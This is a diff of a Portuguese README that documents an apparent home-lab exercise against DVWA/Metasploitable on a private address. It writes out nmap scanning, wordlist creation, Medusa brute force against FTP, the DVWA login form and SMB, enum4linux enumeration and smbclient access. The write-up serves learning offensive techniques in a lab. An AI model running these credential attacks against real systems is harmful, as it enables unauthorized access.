@@ -31,17 +31,18 @@ O objetivo deste projeto foi compreender as técnicas ofensivas e refletir sobre
       
 <br>
 
-## 🚪 Cenário de Ataque no protocolo FTP:
- * **Etapa 1: Escanear possiveis portas abertas e o tipo de serviço:**
+## 🚪 Cenário de Ataque no Protocolo FTP:
+ * **Etapa 1:** Escanear possiveis portas abertas e o tipo de serviço:
    ```bash
    nmap -sV -p 21,22,80,445,139 coloque o IP
    ```
   <img width="1029" height="553" alt="image" src="https://github.com/user-attachments/assets/a6544b03-ac68-4690-962d-9654814ada3a" />
+  
   * **Resultado da análise:** Acesso bem `sucedido` ✔
 
 <br>
 
-* **Etapa 2: Quebrando senhas com a ferramenta Medusa: Faça a criação de arquivos com possíveis nomes de usuários e senhas:**
+* **Etapa 2:** Quebrando senhas com a ferramenta Medusa: Faça a criação de arquivos com possíveis nomes de usuários e senhas:
  ```bash
 echo -e "user\nmsfadmin\nadmin\nroot" > users.txt
 ```
@@ -50,14 +51,15 @@ echo -e "user\nmsfadmin\nadmin\nroot" > users.txt
 echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt
 ```
  <img width="1179" height="555" alt="image" src="https://github.com/user-attachments/assets/5a336aa4-5ce3-4112-b86f-c1d37de474d4" />
- * **Resultado da exploração:** Usuário e Login encontrados com sucesso! Podemos entrar acessar a conexão FTP com privilégios ✔
+ 
+ * **Resultado da exploração:** Usuário e Login encontrados com sucesso ✔
 
 ## 📑 Cenários de Ataques em Formulários de Login:
-* **Etapa 3: Entrar no site: DVWA**
+* **Etapa 3:** Entrar no site: DVWA
 ```bash
 192.168.56.102/dvwa/login.php
 ```
-**3.1 - Criar wordlists para usuários e senhas;**
+**3.1 - Criar wordlists para usuários e senhas;
 **3.2 - Rodar o seguinte comando:**
 ```bash
 medusa -h 192.168.56.102 -U users.txt -P pass.txt -M http \
@@ -66,20 +68,26 @@ medusa -h 192.168.56.102 -U users.txt -P pass.txt -M http \
 -m 'FAIL=Login failed' -t 6
 ```
 <img width="1251" height="607" alt="image" src="https://github.com/user-attachments/assets/2068f786-ab68-4490-82f5-79932d1fc090" />
-- **Resumo: O comando faz brute force no login do DVWA via HTTP, usando listas de usuários e senhas, enviando requisições do tipo POST, identificando falhas pelo texto “Login failed” e executando tudo em 6 tentativas acontecendo ao mesmo tempo.**
+
+- **Resumo:** O comando faz brute force no login do DVWA via HTTP, usando listas de usuários e senhas, enviando requisições do tipo POST, identificando falhas pelo texto “Login failed” e executando tudo em 6 tentativas acontecendo ao mesmo tempo.
 
 ## 💻 Cenários de Ataques SMB:
-* **Etapa 4: Enumerar informações de sistemas Windows ou serviços SMB/Samba.**
+* **Etapa 4:** Enumerar informações de sistemas Windows ou serviços SMB/Samba.
 ```bash
 enum4linux -a 192.168.56.102 | tee enum4_output.txt
 ```
 * **Resultado da análise:** Acesso a listas de usuários, compartilhamentos disponiveis e até nome de dominio ✔
 
-* **Etapa 4.1: Ataque ao SMB com a medusa**
+* **Etapa 4.1:** Ataque ao SMB com a medusa
 ```bash
 medusa -h 192.168.56.102 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50 
 ```
-<img width="1146" height="546" alt="image" src="https://github.com/user-attachments/assets/9b16f8ab-29c3-47b1-9ec8-af98c3ac33bb" />
+* **Etapa 4.1:** Acesso ao servidor SMB:
+```bash
+smbclient -L //192.168.56.102 -U msfadmin
+```
+<img width="1153" height="548" alt="image" src="https://github.com/user-attachments/assets/88750cfd-fca7-4dae-87d2-2acc93335eaf" />
+
   
 ![](https://i.imgur.com/WTLoFrq.png)
 
